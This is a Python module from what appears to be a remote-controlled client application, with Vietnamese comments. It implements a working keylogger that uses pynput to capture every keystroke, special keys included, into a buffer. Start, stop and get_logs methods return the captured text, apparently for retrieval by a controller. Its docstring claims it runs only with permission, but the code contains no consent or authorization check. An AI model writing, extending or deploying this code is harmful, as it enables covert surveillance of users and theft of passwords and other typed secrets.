# client-app/modules/keylogger.py
from pynput import keyboard
import logging

logger = logging.getLogger("Module-Keylogger")

class KeyloggerManager:
    """Module theo dõi phím gõ người dùng (Chỉ chạy khi được phân quyền)."""
    
    def __init__(self):
        self.log_data = ""
        self.listener = None
        self.is_running = False
        self._MAX_LOG_LEN = 10000

    def _on_press(self, key):
        try:
            if key.char:
                self.log_data += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log_data += " "
            elif key == keyboard.Key.enter:
                self.log_data += "\n"
            elif key == keyboard.Key.backspace:
                self.log_data += "[BACKSPACE]"
            else:
                self.log_data += f"[{key.name.upper()}]"
        # Giới hạn bộ đệm, xóa nửa đầu nếu vượt quá
        if len(self.log_data) > self._MAX_LOG_LEN:
            self.log_data = self.log_data[-(self._MAX_LOG_LEN // 2):]

    def start(self) -> dict:
        """Bắt đầu ghi nhận phím gõ."""
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_running = True
            logger.info("Keylogger da khoi dong.")
            return {"success": True, "message": "Da BAT bo ghi phim."}
        return {"success": True, "message": "Bo ghi phim dang chay san."}

    def stop(self) -> dict:
        """Dừng ghi nhận phím."""
        if self.is_running and self.listener:
            self.listener.stop()
            self.is_running = False
            logger.info("Keylogger da dung.")
            return {"success": True, "message": "Da TAT bo ghi phim."}
        return {"success": True, "message": "Bo ghi phim da tat tu truoc."}

    def get_logs(self, clear_after_read: bool = True) -> dict:
        """Lấy dữ liệu phím đã gõ và xóa bộ đệm nếu cần."""
        current_logs = self.log_data
        if clear_after_read:
            self.log_data = ""
        return {"success": True, "logs": current_logs}

# Khởi tạo instance
keylogger_manager = KeyloggerManager()